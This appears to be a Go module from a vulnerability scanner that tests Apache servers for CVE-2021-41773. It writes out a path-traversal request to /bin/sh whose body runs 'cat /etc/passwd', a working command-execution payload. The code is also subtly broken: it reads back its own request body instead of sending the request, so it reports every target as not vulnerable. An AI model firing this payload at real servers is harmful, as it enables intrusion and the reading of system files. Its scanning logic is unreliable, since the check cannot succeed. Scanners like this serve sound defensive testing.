package apache

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"uscan/modules/handling"

	"github.com/fatih/color"
)

// Exploit url https://github.com/thehackersbrain/CVE-2021-41773/blob/main/exploit.py
// CVE: CVE-2021-41773

func CVE_41773(url string, userAgent string) {
	stringData := `echo Content-Type: text/plain; echo; cat /etc/passwd`
	req, err := http.NewRequest("POST", url+"/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh", bytes.NewBuffer([]byte(stringData)))
	req.Header.Set("User-Agent", userAgent)
	req.Header.Set("Content-Type", "Content-Type: text/plain")

	body, bodyerr := ioutil.ReadAll(req.Body)
	handling.ErrCheck(err, bodyerr)

	sb := string(body)

	if strings.Contains(sb, "root:x:0:0:root:/root:/bin/bash") {
		fmt.Println("Apache2 " + color.GreenString(">> ") + "CVE-2021-41773 " + color.GreenString("Vuln"))
	} else {
		fmt.Println("Apache2 " + color.GreenString(">> ") + "CVE-2021-41773 " + color.RedString("Not vuln"))
	}

}
